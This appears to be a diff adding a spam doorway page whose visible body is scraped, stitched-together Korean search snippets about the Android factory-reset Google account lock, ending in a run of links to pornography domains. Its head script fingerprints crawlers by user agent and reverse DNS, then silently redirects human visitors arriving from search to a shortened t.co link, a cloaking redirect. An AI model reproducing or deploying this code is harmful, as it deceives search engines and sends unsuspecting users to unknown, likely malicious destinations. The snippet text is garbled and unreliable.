@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>11813</title>
+</script>
+</head>
+<body>
+<h1>이 기기는 재설정되었습니다 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요</h1>
+<p>2018-04-28 — 1. 기존에 사용하던(판매자) 유심카드를 끼운 후 구글계정을 로그아웃, 계정삭제 한 다음 공장초기화 · 2. 중고거래를 통해 구글 안드로이드 폰을 구입 ...2020-08-06 — 말그대로 해당 문제를 해결하기 위해서는 기존에 사용하던 구글계정으로 로그인해야 하며 다른 계정으로 로그인은 불가능합니다. 이러한 증상이 발생하는 ...2019-12-31 — 이와 같이 "이 기기는 재설정되었습니다. 계속하려면 이전의 이 기기에 동기화된 Google 계정으로 로그인하세요"라는 계정확인 메뉴가 뜨면서 이전 ...2023-04-27 — 이글은 강제초기화로 인해서 '이 기기는 재설정되었습니다' 라는 구글락이 걸렸을때 해제하는 방법에 대해서 공유하는 글 입니다.2021-04-30 — 이 기기는 재설정되었습니다. 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요. 보통 핸드폰 강제 초기화 후 구글계정이 잠기면 ...2022-01-11 — 이 기기는 재설정되었습니다. 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요. 이게뭐지? 삼성전자 서비스 센터를 찾았다.2023-05-12 — 기기 보호(FRP)에 관해 자세히 알아보세요. "이 기기는 재설정되었습니다. 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요.".2021-11-13 — 계속하려면 이전에 이 기기에 동기화된 구글 계정으로 로그인하세요"가 떠있는거임. 문구를 확인한 순간 '아 이거 큰일났다.. 이전에 동기화된 구글 계정.2018-02-12 — 계정 확인 Google 이 기기는 재설정되었습니다. 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요 이메일 주소 입력 휴대폰 공장 ...계속하려면 이전에이 기기에서 동기화 된 Google 계정으로 로그인하세요]. 같은 오류로 화면에 갇혀 있다면이 페이지는 많은 의미를 가질 수 있습니다.2016-09-15 — 스마트폰에 구글 계정이 등록된 상태로 공장초기화를 하고,. 그 이후에 72시간 이내에 비밀 번호를 변경하면 그 핸드폰은 도난 처리가 되는 모양이더군요.prieš 7 dienas — UNDERkg 갤럭시 구글락 해제 1분내 끝내기 - 이 기기는 재설정 ... 이 기기는 재설정되었습니다 계속하려면 이전에 이 기기에 동기화된 Google 계정 ...prieš 2 dienas — 구글계정 잠김 유심변경 개발자옵션 이 기기는 재설정되었습니다 2020 ... 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요 구글 ...prieš 2 dienas — 이 기기는 재설정 되었습니다 라는 문구가 뜨며 락에 걸리는 경우가 꽤 ... 한다 이 기기는 이전에 동기화 된 Google 계정으로 로그인을 계속하도록 ...구글 오늘날 거의 모든 Android 기기에서 없어서는 안될 부분입니다. 사실, 모든 새 장치의 설정 프로세스에는 다음 설정이 포함됩니다. Google 계정 동기화합니다.... 이 기기의 소유자 계정중 ·이와 같이 " 이 기기는 재설정되었습니다 계속하려면 이전의 이 기기에 동기화된 Google 계정으로 로그인하세요 "라는 계정확인 메뉴가 ...2021-01-15 — 안녕하세요! 어제 포스팅한 갤럭시 &amp; 안드로이드 스마트폰 공장 초기화 방법에 이어 공장 초기화 전에 알아두어야 할 초기화 후 볼 수도 있는 "이 기기는 ...2018-01-28 — 중고로 구입한 스마트폰을 공장 초기화한 후 맞이하게 된 상황이다. 검색을 먼저해보았다. 주로 서비스센터로 가라는 내용이었다. 주변에 가까운 서비스 ...prieš 11 valandų — 2022 — 이 기기는 재설정되었습니다 · 통신사 방문 후 해지서류(해지 된 ... 계속하려면 이전에 이 기기에 동기화된 Google 계정으로 로그인하세요 ...Google 앱이 설치된 Android 기기를 사용하는 경우 기기는 주기적으로 Google 서버에 연결되어 기기와 서비스 연결에 대한 정보를 제공합니다. 이 정보에는 기기 유형, ...prieš 13 valandų — 2023 — 구글 계정을 로그아웃하지 않고 공장초기화를 실행했을 때 '이 기기는 재설정되었습니다. 계속하려면 이전에 이 기기에 동기화된 Google 계정 ...prieš 11 valandų — 이제 휴대 전화의 Google 계정이 72 시간 동안 잠겼으며 재설정 될 때 …10 dec. ... 갤럭시 구글락 해제 1분내 끝내기 – 이 기기는 재설정 되었습니다 ...prieš 9 valandas — 이 기기 는 재설정 되었습니다 계속 하려면 이전 에 이 기기 에 동기화 된 google 계정 으로 로그인 하세요수능 비문학 pdf 황제 를 위하여 엑 s ...prieš 4 valandas — Chrome 등의 브라우저에서 Google 계정에 로그인합니다. ... 이전주인 핸드폰으로 평소와 다른활동이 Jul 4, 2020 평소와 다른 활동이 감지되었습니다 ...prieš 2 minutes — 연결"이라고 Iphone이 비활성화되었음 itunes에 연결 Iphone이 비활성화 ... 되기 전에 비밀번호 초기화로 ·아이폰 기기가 비활성화되었습니다 문구는 ...prieš 11 valandų — 2023 — 제가 6~7개월 전에 구글 계정으로 삼성 계정을 생성했었습니다. ... 2021 — 갤럭시-스마트폰에-삼성계정이-등록된-화면 · 스마트폰-설정-앱 ...prieš 4 valandas — 먼저 아래 사이트로 접속해서 구글 계정으로 로그인합니다. https ... Google이 계정 데이터 삭제를 지원하는 방법; Google의 내 활동을 통한 데이터 ...A 결론은 Apple 회원가입을 할 때, 자신의 주소를 입력하지 않아서이다 자세한 내용 ... 이 애플아이디는 앱스토어에서 사용된적이 없습니다 계정을 확인하세요' 이런 ...prieš 16 valandų — ※ 닫은 탭 복구 단축키로는 Ctrl + Shift + T입니다. 다음 설정이 Chrome 프로필로 로그인하는 모든 기기의 기본값으로 변경됩니다.내 컴퓨터가 아닌가요?prieš 10 valandų — 스마트 앱 관리자(Smart App Manager | SAM)는 안드로이드 기기에 설치된 ... 하지만 바로 어제 이 안드로이드 기기관리자가 앱으로 출시되었습니다.prieš 4 valandas — ... 및 공유 앨범 켜는 법 2부: iPhone 및 iPad에서 삭제된 공유 사진을 다시 ... 선택한 사진 파일이 pdf로 변환되었습니다 이 pdf 파일을 내 기기에 ...iOS 14 및 이전 버전에서는 대화 옆에 초승달 아이콘이 표시됩니다. 알림 가리기를 켜면 기기에서 특정 그룹 문자 메시지에 대한 알림만 받지 못하게 되며, ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
